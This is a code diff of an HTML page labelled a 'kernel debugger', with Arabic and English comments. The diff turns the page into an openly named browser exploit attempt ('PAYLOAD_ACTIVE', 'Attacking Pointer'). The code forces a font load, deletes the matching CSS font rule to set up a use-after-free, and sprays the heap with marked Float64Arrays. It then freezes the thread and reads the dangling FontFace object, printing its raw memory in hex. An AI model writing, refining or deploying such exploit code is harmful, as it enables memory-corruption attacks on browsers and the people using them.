@@ -8,7 +8,7 @@
     </style>
 </head>
 <body>
-    <h3>JANUS_KERNEL_DEBUGGER v2.0 [STABLE_TRIGGER]</h3>
+    <h3>JANUS_KERNEL_DEBUGGER v3.0 [PAYLOAD_ACTIVE]</h3>
     <div id="console"></div>
     <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 
@@ -20,47 +20,42 @@
         };
 
         window.onload = async () => {
-            log("INIT: Kernel Debugger Active.");
+            log("INIT: Payload deployment started.");
             
-            // 1. إعداد الفخ (The Memory Trap)
             let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            
-            log("Monitoring font status...");
+            window.spray = [];
 
-            // 2. استخدام التوقيت المعتمد بدلاً من الـ Hook المحجوب
-            // سنراقب متى يبدأ المحرك بمعالجة الخط
-            try {
-                // محاولة التحميل القسري
-                document.fonts.load('1em targetFont', 'AB');
+            // Triggering process
+            document.fonts.load('1em targetFont', 'AB');
+
+            setTimeout(() => {
+                log("Executing Rule Deletion...");
+                document.getElementById('s').sheet.deleteRule(0);
                 
-                // نستخدم setTimeout لضمان أننا في الـ Event Loop الصحيح بعد محاولة التحميل
-                setTimeout(() => {
-                    log("Triggering Rule Deletion...");
-                    document.getElementById('s').sheet.deleteRule(0);
-                    
-                    log("Heap Grooming: Spraying ArrayBuffers...");
-                    window.spray = [];
-                    for (let i = 0; i < 2000; i++) {
-                        let buf = new Float64Array(32);
-                        buf[0] = 0.555;
-                        window.spray.push(buf);
-                    }
-                    
-                    log("Grooming complete. Checking for memory collision...");
-                    
-                    // محاولة القراءة النهائية
-                    try {
-                        let val = A.family;
-                        log("READ_RESULT: " + val);
-                    } catch(err) {
-                        log("READ_STATUS: " + err.message);
-                    }
-                }, 100);
+                log("Grooming: Spraying Memory...");
+                for (let i = 0; i < 8000; i++) {
+                    // استخدام قيمة مميزة جداً (0.1337) لتمييز تداخلنا
+                    let buf = new Float64Array(32);
+                    buf[0] = 0.1337; 
+                    window.spray.push(buf);
+                }
 
-            } catch(e) {
-                log("FATAL_ERROR: " + e.message);
-            }
+                // التجميد القسري للمسار الرئيسي لضمان الاستقرار (Thread Freezing)
+                log("Freezing Execution Thread...");
+                let start = performance.now();
+                while(performance.now() - start < 300); 
+
+                log("Thread Released. Attacking Pointer...");
+                try {
+                    let val = A.family;
+                    // تحويل القيمة إلى صيغة Hex لاستكشاف الذاكرة الخام
+                    let view = new DataView(new Float64Array([val]).buffer);
+                    log("READ_RAW_HEX: 0x" + view.getBigUint64(0).toString(16));
+                } catch(err) {
+                    log("READ_CRASH_DETECTED: " + err.message);
+                }
+            }, 100);
         };
     </script>
 </body>
